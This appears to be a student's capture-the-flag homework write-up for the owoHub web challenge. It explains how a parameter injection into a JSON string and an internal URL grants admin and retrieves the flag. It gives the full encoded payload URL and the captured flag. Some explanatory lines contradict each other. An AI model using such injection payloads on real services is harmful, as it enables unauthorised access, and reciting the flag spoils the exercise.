# Computer Security Fall 2020 HW0 writeup

## Web - owoHub
> FLAG{owo_ch1wawa_15_th3_b35t_uwu!!!}

1. Check *source code*
   - how to get flag?
   ```js
   // but the function can't be directly access by external users
   if (givemeflag === "yes" && userInfo.admin) response.send(FLAG);
   ```
   - where can be used?
      > `app.get('/auth', (request, response) => { const { username, cute } = request.query;`
      1. only check that `cute` end with `true` or `false`
      ```js
      if (typeof username !== "string" || typeof cute !== "string" || username === "" || !cute.match("(true|false)$"))
      ```
      1. `userInfo` take `cute` from the request query directly
      ```js
      const userInfo = `{"username":"${username}","admin":false,"cute":${cute}}`;
      ```
      1. use `userInfo` define in the previous step in the url and be used to `GET` **internally**
      ```js
      const api = `http://127.0.0.1:9487/?data=${userInfo}&givemeflag=no`;
      ```
2. give a random `username` and `cute`
   `https://owohub.zoolab.org/auth?username=a&cute=true`
3. make `admin` to be true
   `https://owohub.zoolab.org/auth?username=a&cute=true,%22admin%22:true`
   - since `userInfo` is `{"username":"${username}","admin":false,"cute":${cute}}`, by injecting `cute` previous key/value pair `"admin":false`
   - make `cute` to be `true,"admin":true`, `userInfo` will then be `{"username":"a","admin":false,"cute":true}`. That is, `{"username":"a","admin":true,"cute":false}`
4. make `givemeflag` to be `"yes"`
   1. want something like this, `https://owohub.zoolab.org/auth?username=a&cute=true,"admin":true}&givemeflag=yes#true`
      > `}` close the bracket for `useInfo` which make all the things after it not a part of `userInfo`  
      > `#` point a browser to a specific part or page but all characters after `#` will not be sent in request  
      - make `api` to be `http://127.0.0.1:9487/?data={"username":"a","admin":true,"cute":false}&givemeflag=yes#true&givemeflag=no`
      - the actual request being send internally should be `http://127.0.0.1:9487/?data={"username":"a","admin":true,"cute":false}&givemeflag=yes`
   1. try and get `{"error":"Whaaaat owo?"}`
      - currently, `cute` is `false,"admin":true}` so that it doesn't end with `true` or `false`
      - `cute` only take the part before the next `&`
   1. *url encoding*
      > find the correspoding encode for `"}&#`  
      - then, the url should be `https://owohub.zoolab.org/auth?username=a&cute=true,%22admin%22:true%7D%26givemeflag=yes%23true`

